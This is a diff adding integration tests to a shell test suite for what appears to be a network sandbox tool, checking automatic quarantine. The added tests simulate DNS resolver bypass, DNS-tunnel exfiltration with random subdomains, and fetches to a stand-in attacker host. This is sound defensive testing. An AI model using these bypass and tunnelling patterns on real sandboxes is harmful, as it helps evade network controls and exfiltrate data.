@@ -84,6 +84,46 @@ expect_eq "allowlisted fetch works again" "$(sbx t1 curl -sS -m 10 -o /dev/null 
 expect_eq "relayed fetch works again" "$(sbx t1 curl -sS -m 10 -o /dev/null -w '%{http_code}' http://a.attacker.test/)" 200
 expect_fail "releasing twice is an error" sandwall sandbox release t1
 
+log "automatic quarantine: DNS bypass"
+is_quarantined() { sandwall sandbox list --json | jq -r --arg id "$1" '.[] | select(.id==$id) | .quarantine != null'; }
+# wait_quarantined <id>: up to 5s for a trigger to quarantine the sandbox.
+wait_quarantined() {
+	for _ in $(seq 50); do [[ "$(is_quarantined "$1")" == true ]] && return 0; sleep 0.1; done
+	return 1
+}
+expect_ok "create a1 with a dns_bypass trigger (3 within 30s)" sandwall sandbox create a1 --policy "$P/autoq-bypass.yaml"
+sbx a1 dig +tries=1 +time=1 @8.8.8.8 example.com >/dev/null 2>&1
+sbx a1 dig +tries=1 +time=1 @9.9.9.9 example.com >/dev/null 2>&1
+sleep 1
+expect_eq "two attempts do not trigger" "$(is_quarantined a1)" false
+sbx a1 dig +tries=1 +time=1 @1.0.0.1 example.com >/dev/null 2>&1
+expect_ok "the third attempt quarantines a1" wait_quarantined a1
+wait_log a1 "auto quarantine logged with the trigger and last event" \
+	'.type=="quarantine" and (.reason|startswith("auto: 3 x dns_bypass|sni_mismatch within 30s (last: dns_bypass 1.0.0.1:53)"))'
+expect_fail "a1 is cut off" sbx a1 curl -sS -m 3 "http://a.attacker.test:$ATTACKER_PORT/"
+expect_ok "auto quarantine counted" bash -c "curl -s http://127.0.0.1:19464/metrics | grep -q '^sandwall_auto_quarantines_total{sandbox=\"a1\"} 1'"
+expect_ok "release a1" sandwall sandbox release a1
+expect_ok "policy without triggers" sandwall policy apply a1 "$P/proxy.yaml"
+for ns in 8.8.8.8 9.9.9.9 1.0.0.1; do sbx a1 dig +tries=1 +time=1 @$ns example.com >/dev/null 2>&1; done
+sleep 1
+expect_eq "no trigger after policy apply removed it" "$(is_quarantined a1)" false
+
+log "automatic quarantine: DNS tunnel, frozen"
+expect_ok "create a2 with a dns_refused trigger (5 within 30s, freeze)" sandwall sandbox create a2 --policy "$P/autoq-tunnel.yaml"
+sbx a2 sleep 300 &
+sleep 1
+a2pid=$(ip netns pids "$(sb_field a2 .netns)" | while read -r p; do [[ "$(cat "/proc/$p/comm" 2>/dev/null)" == sleep ]] && echo "$p"; done | head -1)
+for i in 1 2 3 4 5; do dns_status a2 "$(head -c12 /dev/urandom | xxd -p).tunnel.test" >/dev/null; done
+expect_ok "five refused names quarantine a2" wait_quarantined a2
+expect_eq "a2 frozen by the trigger" "$(sandwall sandbox list --json | jq -r '.[] | select(.id=="a2") | .quarantine.frozen')" true
+expect_eq "a2's process stopped" "$(awk '{print $3}' "/proc/$a2pid/stat")" T
+expect_fail "no tunnel name reached the upstream resolver" grep -q "tunnel.test" "$ATTACKER_LOOT"
+expect_ok "release a2" sandwall sandbox release a2
+for i in 1 2 3 4; do dns_status a2 "$(head -c12 /dev/urandom | xxd -p).tunnel.test" >/dev/null; done
+sleep 1
+expect_eq "counts start over after a release (4 of 5)" "$(is_quarantined a2)" false
+kill "$a2pid" 2>/dev/null
+
 log "destroy while quarantined"
 expect_ok "quarantine --freeze again" sandwall sandbox quarantine t1 --freeze
 expect_ok "destroy t1" sandwall sandbox destroy t1
